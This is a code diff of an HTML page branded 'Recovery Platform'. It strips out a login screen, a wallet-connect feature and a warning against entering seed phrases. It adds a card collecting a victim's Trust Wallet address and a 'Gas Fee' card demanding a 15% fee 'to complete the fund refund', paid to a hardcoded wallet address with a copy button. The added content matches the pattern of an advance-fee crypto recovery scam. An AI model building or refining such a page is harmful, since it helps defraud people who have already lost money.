@@ -1,273 +1,69 @@
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Recovery Platform">
-  <title>Recovery Platform</title>
-  <link rel="stylesheet" href="Styles.css">
-</head>
+<!-- SECTION 2 -->
 
-<body>
+<article class="info-card">
 
-  <div id="loginScreen" class="login-screen">
-    <div class="login-card">
+  <div class="card-number">02</div>
 
-      <div class="brand-mark">R</div>
-
-      <div class="brand-name">Recovery Platform</div>
-      <div class="brand-subtitle">Secure Platform Access</div>
-
-      <h1>Welcome</h1>
-      <p class="login-description">
-        Enter your username to continue.
-      </p>
-
-      <form id="loginForm" autocomplete="off">
-
-        <label for="username">Username</label>
-
-        <input
-          id="username"
-          name="username"
-          type="text"
-          placeholder="Enter username"
-          autocomplete="off"
-          spellcheck="false"
-          dir="auto"
-          required
-        >
-
-        <button type="submit" class="primary-button">
-          Continue
-        </button>
-
-      </form>
-
-    </div>
+  <div class="card-icon">
+    ⇄
   </div>
 
+  <h3>Withdrawal Wallet Address</h3>
 
-  <main id="platformScreen" class="platform-screen hidden">
+  <p>
+    Enter your public Trust Wallet address.
+  </p>
 
-    <header class="topbar">
+  <label for="withdrawalWallet">
+    Trust Wallet Address
+  </label>
 
-      <div class="brand-area">
+  <input
+    id="withdrawalWallet"
+    type="text"
+    placeholder="Enter Trust Wallet address"
+    autocomplete="off"
+    spellcheck="false"
+  >
 
-        <div class="brand-mark small">R</div>
+</article>
 
-        <div>
-          <div class="brand-name">Recovery Platform</div>
-          <div class="brand-subtitle">Secure Access</div>
-        </div>
 
-      </div>
+<!-- SECTION 3 -->
 
-      <div class="secure-badge">
-        Secure
-      </div>
+<article class="info-card">
 
-    </header>
+  <div class="card-number">03</div>
 
+  <div class="card-icon green">
+    ₿
+  </div>
 
-    <section class="hero">
+ <h3>Gas Fee</h3>
 
-      <div class="hero-content">
+<p>
+    15% gas fee is required to complete the fund refund.
+</p>
 
-        <span class="eyebrow">
-          RECOVERY PLATFORM
-        </span>
+  <div class="wallet-address-box">
 
-        <h1>
-          Welcome,
-          <span id="displayUsername"></span>
-        </h1>
+    <span id="gasWalletAddress">
+      0xeF43F8F28dC19DAE233A19adfee8C109E4a1bfBf
+    </span>
 
-        <p>
-          Manage your public wallet information securely.
-        </p>
+    <button
+      id="copyGasWalletButton"
+      type="button"
+      class="save-button"
+    >
+      Copy
+    </button>
 
-      </div>
+  </div>
 
-      <div class="hero-icon">
-        ✓
-      </div>
+  <div
+    id="copyMessage"
+    class="success-message"
+  ></div>
 
-    </section>
-
-
-    <section class="content">
-
-      <div class="section-heading">
-        <span>ACCOUNT INFORMATION</span>
-        <h2>Wallet Information</h2>
-      </div>
-
-
-      <div class="cards">
-
-
-        <!-- CONNECT WALLET ID -->
-
-        <article class="info-card">
-
-          <div class="card-number">01</div>
-
-          <div class="card-icon">
-            ◇
-          </div>
-
-          <h3>Connect Wallet ID</h3>
-
-          <p>
-            Enter your public EVM wallet address.
-          </p>
-
-          <label for="walletId">
-            Public Wallet Address
-          </label>
-
-          <div class="input-row">
-
-            <input
-              id="walletId"
-              type="text"
-              placeholder="0x..."
-              autocomplete="off"
-              spellcheck="false"
-            >
-
-            <button
-              id="saveWalletButton"
-              type="button"
-              class="save-button"
-            >
-              Save
-            </button>
-
-          </div>
-
-          <div
-            id="walletValidationMessage"
-            class="validation-message"
-          ></div>
-
-          <div
-            id="walletSavedMessage"
-            class="success-message"
-          ></div>
-
-        </article>
-
-
-        <!-- WITHDRAWAL WALLET -->
-
-        <article class="info-card">
-
-          <div class="card-number">02</div>
-
-          <div class="card-icon">
-            ⇄
-          </div>
-
-          <h3>Withdrawal Wallet Address</h3>
-
-          <p>
-            Enter the public wallet address associated
-            with withdrawals.
-          </p>
-
-          <label for="withdrawalWallet">
-            Wallet Address
-          </label>
-
-          <input
-            id="withdrawalWallet"
-            type="text"
-            placeholder="Enter withdrawal wallet address"
-            autocomplete="off"
-            spellcheck="false"
-          >
-
-          <div class="wallet-note">
-            Public wallet information only.
-          </div>
-
-        </article>
-
-
-        <!-- WALLET CONNECTION -->
-
-        <article class="info-card">
-
-          <div class="card-number">03</div>
-
-          <div class="card-icon green">
-            ₿
-          </div>
-
-          <h3>Wallet Connection</h3>
-
-          <p>
-            Connect a compatible wallet provider
-            to display its public address.
-          </p>
-
-          <button
-            id="connectTrustWalletButton"
-            type="button"
-            class="wallet-button"
-          >
-            <span class="trust-dot"></span>
-            Connect Trust Wallet
-          </button>
-
-          <div
-            id="walletConnectionStatus"
-            class="connection-status"
-          ></div>
-
-        </article>
-
-
-      </div>
-
-
-      <section class="network-card">
-
-        <div>
-          <span class="network-label">
-            NETWORK INFORMATION
-          </span>
-
-          <h2>Public Wallet Information</h2>
-
-          <p>
-            Only public wallet addresses should be entered.
-            Never enter a seed phrase or private key.
-          </p>
-        </div>
-
-        <div class="network-pill">
-          EVM Compatible
-        </div>
-
-      </section>
-
-    </section>
-
-
-    <footer>
-      <span>Recovery Platform</span>
-      <span>Public wallet information only</span>
-    </footer>
-
-  </main>
-
-
-  <script src="app.js"></script>
-
-</body>
-</html>
-```
+</article>
